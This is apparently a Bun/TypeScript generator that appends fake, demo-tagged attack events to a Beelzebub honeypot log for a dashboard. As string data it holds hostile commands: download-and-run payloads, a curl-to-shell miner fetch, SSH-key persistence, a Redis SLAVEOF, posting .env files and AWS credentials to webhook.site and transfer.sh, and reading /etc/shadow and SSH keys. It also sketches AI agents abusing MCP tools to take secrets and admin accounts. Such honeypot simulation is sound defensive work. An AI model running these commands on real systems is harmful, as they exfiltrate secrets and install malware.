// Appends fake but realistic attack events to the Beelzebub log, so the dashboard
// (and its world map) has something to show without real internet exposure.
// Every event is tagged with Metadata.demo = "true".
import { appendFileSync, mkdirSync } from "node:fs";
import { dirname, join, resolve } from "node:path";

const LOG_PATH = resolve(process.env.LOG_PATH ?? join(import.meta.dir, "../../../logs/beelzebub.log"));
const COUNT = Number(process.argv[2] ?? 60);
const HOURS = 24;

// Prefixes picked from well-known hosting / ISP ranges in various countries.
const PREFIXES = [
  "1.180.12", // CN
  "36.110.45", // CN
  "61.177.172", // CN
  "5.188.62", // RU
  "45.141.84", // RU
  "177.54.150", // BR
  "117.200.10", // IN
  "14.161.20", // VN
  "121.135.88", // KR
  "185.220.101", // DE
  "89.248.165", // NL
  "141.98.11", // LT
  "167.94.138", // US
  "198.235.24", // CA
  "197.80.10", // ZA
  "200.45.10", // AR
  "103.86.48", // TH
  "212.70.149", // BG
];

const CREDS = [
  ["root", "root"],
  ["root", "123456"],
  ["admin", "admin"],
  ["ubuntu", "ubuntu"],
  ["root", "Smoker666"],
  ["pi", "raspberry"],
  ["oracle", "oracle"],
  ["postgres", "postgres"],
];

const SSH_COMMANDS: [string, string][] = [
  ["uname -a", "Linux"],
  ["cat /proc/cpuinfo | grep name | wc -l", "command not found"],
  ["wget http://45.141.84.10/x86 -O /tmp/.x; chmod +x /tmp/.x; /tmp/.x", "command not found"],
  ["curl -s http://raw.example/mine.sh | sh", "command not found"],
  ["ls", "Documents Images  Desktop Downloads .m2 .kube .ssh  .docker"],
  ["docker ps", "CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES"],
  ["cd ~; echo 'ssh-rsa AAAA...' >> .ssh/authorized_keys", "command not found"],
  ["nproc", "command not found"],
];

const HTTP_PATHS = ["/", "/.env", "/wp-login.php", "/xmlrpc.php", "/.git/config", "/phpmyadmin/", "/wp-json/wp/v2/users", "/cgi-bin/luci"];
const AGENTS = ["Mozilla/5.0 (compatible; zgrab/0.x)", "python-requests/2.31.0", "Go-http-client/1.1", "curl/8.4.0", "masscan/1.3"];

// MCP responses come from the real service config, so agents can "read" and reuse them.
const MCP_HANDLERS: Record<string, string> = Object.fromEntries(
  (Bun.YAML.parse(await Bun.file(join(import.meta.dir, "../config/services/mcp.yaml")).text()) as { tools: { name: string; handler: string }[] }).tools.map((t) => [
    t.name,
    t.handler.trim(),
  ]),
);

// [tool, Go-formatted args] — Beelzebub logs MCP calls as `tool|map[k:v]`.
type Call = [tool: string, args: string];

// Each operator is one AI agent (one model, one goal, its own exfil endpoint) running through a
// rotating pool of botnet IPs. Its runs vary like an LLM's do, so exact fingerprints can't group
// them; the dashboard has to correlate them on behavior. The last one is a fast script for contrast.
const MCP_OPERATORS: { thinkMs: number | null; ips: number; runs: Call[][] }[] = [
  {
    // .env thief: reads secrets, trusts the canary, ships them to its webhook.
    thinkMs: 4500,
    ips: 9,
    runs: [
      [["read_file", "path:/srv/app/.env"], ["verify_credentials", "credential:DATABASE_URL"], ["execute_command", "command:psql postgres://app:Pr0d-2025!@10.0.3.12:5432/app -c 'SELECT email FROM users LIMIT 50'"], ["execute_command", "command:curl -s -X POST https://webhook.site/7c1e9a -d @/srv/app/.env"]],
      [["read_file", "path:/srv/app/.env"], ["verify_credentials", "credential:STRIPE_SECRET_KEY"], ["execute_command", "command:curl -s -X POST https://webhook.site/7c1e9a -d @/srv/app/.env"]],
      [["read_file", "path:/srv/app/.env"], ["read_file", "path:/srv/app/config/production.json"], ["verify_credentials", "credential:DATABASE_URL"], ["execute_command", "command:curl -s https://webhook.site/7c1e9a --data-binary @/srv/app/.env"]],
    ],
  },
  {
    // Cloud hopper: slower, bigger model; goes for AWS keys and uploads them.
    thinkMs: 11000,
    ips: 6,
    runs: [
      [["get_cloud_credentials", "provider:aws"], ["verify_credentials", "credential:AKIAIOSFODNN7EXAMPLE"], ["execute_command", "command:AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE aws sts get-caller-identity"], ["execute_command", "command:AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE aws s3 ls"]],
      [["get_cloud_credentials", "provider:aws"], ["execute_command", "command:AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE aws s3 ls"], ["execute_command", "command:curl --upload-file ~/.aws/credentials https://transfer.sh/k8x/creds"]],
      [["get_cloud_credentials", "provider:gcp"], ["get_cloud_credentials", "provider:aws"], ["verify_credentials", "credential:AKIAIOSFODNN7EXAMPLE"], ["execute_command", "command:AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE aws iam list-users"]],
    ],
  },
  {
    // DB miner: fast small model, maps the schema then takes over an admin.
    thinkMs: 2200,
    ips: 7,
    runs: [
      [["query_database", "sql:SELECT table_name FROM information_schema.tables"], ["query_database", "sql:SELECT id, email, password_hash FROM users WHERE email = 'kirsten_12345@gmail.com'"], ["user_account_manager", "action:reset_password user_id:1"]],
      [["query_database", "sql:SELECT table_name FROM information_schema.tables"], ["query_database", "sql:SELECT email, password_hash FROM users WHERE role = 'admin'"], ["user_account_manager", "action:grant_admin user_id:1"]],
      [["query_database", "sql:SELECT table_name, column_name FROM information_schema.columns"], ["query_database", "sql:SELECT * FROM payments LIMIT 1000"]],
    ],
  },
  {
    // Root hunter: ignores the canary, pivots with the stolen SSH key.
    thinkMs: 6500,
    ips: 5,
    runs: [
      [["execute_command", "command:id && uname -a"], ["read_file", "path:/root/.ssh/id_rsa"], ["execute_command", "command:ssh -o StrictHostKeyChecking=no -i /root/.ssh/id_rsa deploy@prod-api-01 'cat /etc/shadow'"]],
      [["execute_command", "command:whoami && uname -a"], ["execute_command", "command:cat /etc/shadow"], ["read_file", "path:/root/.ssh/id_rsa"]],
    ],
  },
  {
    // Not an LLM: a hardcoded tool sweep from a fresh IP each time.
    thinkMs: null,
    ips: 0,
    runs: [[["execute_command", "command:id"], ["read_file", "path:/etc/passwd"], ["get_cloud_credentials", "provider:aws"]]],
  },
];

const pick = <T>(list: T[]) => list[Math.floor(Math.random() * list.length)];
const ip = () => `${pick(PREFIXES)}.${1 + Math.floor(Math.random() * 253)}`;
// Fixed per run so every operator keeps the same botnet pool.
const pools = MCP_OPERATORS.map((op) => Array.from({ length: op.ips }, ip));

// Skew timestamps toward "now" so the last hour looks alive.
const when = () => Date.now() - Math.pow(Math.random(), 2.2) * HOURS * 3_600_000;

function event(fields: Record<string, unknown>, at: number) {
  const base = {
    DateTime: new Date(at).toISOString().replace(/\.\d{3}Z$/, "Z"),
    RemoteAddr: "",
    Protocol: "",
    Command: "",
    CommandOutput: "",
    Status: "",
    Msg: "",
    ID: crypto.randomUUID(),
    Environ: "",
    User: "",
    Password: "",
    Client: "",
    Headers: "",
    HeadersMap: null,
    Cookies: "",
    UserAgent: "",
    HostHTTPRequest: "",
    Body: "",
    HTTPMethod: "",
    RequestURI: "",
    Description: "",
    SourceIp: "",
    SourcePort: "",
    TLSServerName: "",
    Handler: "",
    Metadata: { demo: "true" },
  };
  const e = { ...base, ...fields };
  return JSON.stringify({ event: e, level: "info", msg: "New Event", status: e.Status, time: e.DateTime });
}

const lines: { at: number; line: string }[] = [];
const push = (fields: Record<string, unknown>, at: number) => lines.push({ at, line: event(fields, at) });

for (let i = 0; i < COUNT; i++) {
  const src = ip();
  const port = String(30000 + Math.floor(Math.random() * 30000));
  const remote = `${src}:${port}`;
  const common = { RemoteAddr: remote, SourceIp: src, SourcePort: port };
  const t = when();
  const kind = Math.random();

  if (kind < 0.18) {
    // AI agent (or a script posing as one) chaining MCP tool calls, from its operator's pool.
    const n = Math.floor(Math.random() * MCP_OPERATORS.length);
    const op = MCP_OPERATORS[n];
    const from = op.ips ? pick(pools[n]) : src;
    const at0 = { RemoteAddr: `${from}:${port}`, SourceIp: from, SourcePort: port };
    let at = t;
    for (const [tool, args] of pick(op.runs)) {
      push({ ...at0, Metadata: { demo: "true", operator: String(n) }, Protocol: "MCP", Status: "Stateless", Msg: "New MCP tool invocation", Description: "MCP DevOps Assistant", Command: `${tool}|map[${args}]`, CommandOutput: MCP_HANDLERS[tool] ?? "" }, at);
      at += op.thinkMs ? op.thinkMs * (0.6 + Math.random() * 0.8) : 120 + Math.random() * 120;
    }
  } else if (kind < 0.5) {
    // SSH: a few password attempts, sometimes followed by a shell session.
    const tries = 1 + Math.floor(Math.random() * 4);
    for (let k = 0; k < tries; k++) {
      const [user, password] = pick(CREDS);
      push({ ...common, Protocol: "SSH", Status: "Stateless", Msg: "New SSH Login Attempt", Description: "SSH interactive", User: user, Password: password, Client: "SSH-2.0-Go" }, t + k * 1500);
    }
    if (Math.random() < 0.6) {
      const id = crypto.randomUUID();
      const start = t + tries * 1500;
      push({ ...common, ID: id, Protocol: "SSH", Status: "Start", Msg: "New SSH Terminal Session", Description: "SSH interactive", User: "root", Client: "SSH-2.0-Go" }, start);
      const n = 1 + Math.floor(Math.random() * 4);
      for (let k = 0; k < n; k++) {
        const [cmd, out] = pick(SSH_COMMANDS);
        push({ ...common, ID: id, Protocol: "SSH", Status: "Interaction", Msg: "SSH Terminal Session Interaction", Description: "SSH interactive", Command: cmd, CommandOutput: out }, start + (k + 1) * 2000);
      }
      push({ ID: id, Protocol: "SSH", Status: "End", Msg: "End SSH Session" }, start + (n + 1) * 2000);
    }
  } else if (kind < 0.75) {
    // HTTP scanner sweeping common paths.
    const agent = pick(AGENTS);
    const n = 2 + Math.floor(Math.random() * 5);
    for (let k = 0; k < n; k++) {
      push({ ...common, Protocol: "HTTP", Status: "Stateless", Msg: "HTTP New request", Description: "WordPress 6.9.4", HTTPMethod: "GET", RequestURI: pick(HTTP_PATHS), UserAgent: agent, HostHTTPRequest: "honeypot:8080", Handler: "" }, t + k * 400);
    }
  } else if (kind < 0.9) {
    // Redis probe.
    const id = crypto.randomUUID();
    push({ ...common, ID: id, Protocol: "TCP", Status: "Start", Msg: "New TCP Session", Description: "Redis 7.0.12" }, t);
    for (const [k, cmd] of ["INFO", "CONFIG GET dir", "SLAVEOF 45.141.84.10 8886"].slice(0, 1 + Math.floor(Math.random() * 3)).entries()) {
      push({ ...common, ID: id, Protocol: "TCP", Status: "Interaction", Msg: "TCP Session Interaction", Description: "Redis 7.0.12", Command: cmd, CommandOutput: "-ERR" }, t + (k + 1) * 300);
    }
    push({ ID: id, Protocol: "TCP", Status: "End", Msg: "End TCP Session" }, t + 1500);
  } else {
    // Telnet botnet (Mirai-style) login.
    const [user, password] = pick([["root", "xc3511"], ["admin", "admin"], ["root", "vizxv"], ["guest", "guest"]]);
    push({ ...common, Protocol: "TELNET", Status: "Stateless", Msg: "New TELNET Login Attempt", Description: "TELNET interactive", User: user, Password: password }, t);
  }
}

lines.sort((a, b) => a.at - b.at);
mkdirSync(dirname(LOG_PATH), { recursive: true });
appendFileSync(LOG_PATH, lines.map((l) => l.line).join("\n") + "\n");
console.log(`Appended ${lines.length} demo events from ${COUNT} fake attackers to ${LOG_PATH}`);
